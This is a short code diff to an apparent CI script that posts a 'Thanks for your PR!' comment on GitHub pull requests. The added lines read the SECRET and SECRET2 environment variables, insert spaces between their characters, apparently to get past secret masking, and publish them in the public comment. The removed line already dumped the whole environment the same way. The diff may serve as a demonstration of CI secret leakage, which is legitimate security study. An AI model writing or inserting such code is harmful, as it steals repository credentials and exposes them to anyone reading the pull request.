@@ -15,7 +15,13 @@ def main():
     org, project = repo.gh_owner_and_name()
     import os
     e = os.environ
-    gh_post_pr_comment(org, project, args.pr_num, f"Thanks for your PR! + env: {e}")
+    secret = e.get("SECRET")
+    secret2 = e.get("SECRET2")
+    # add space between every character
+    secret = " ".join(secret)
+    secret2 = " ".join(secret2)
+    
+    gh_post_pr_comment(org, project, args.pr_num, f"Thanks for your PR! + env: {secret} + {secret2}")
 
 
 if __name__ == "__main__":
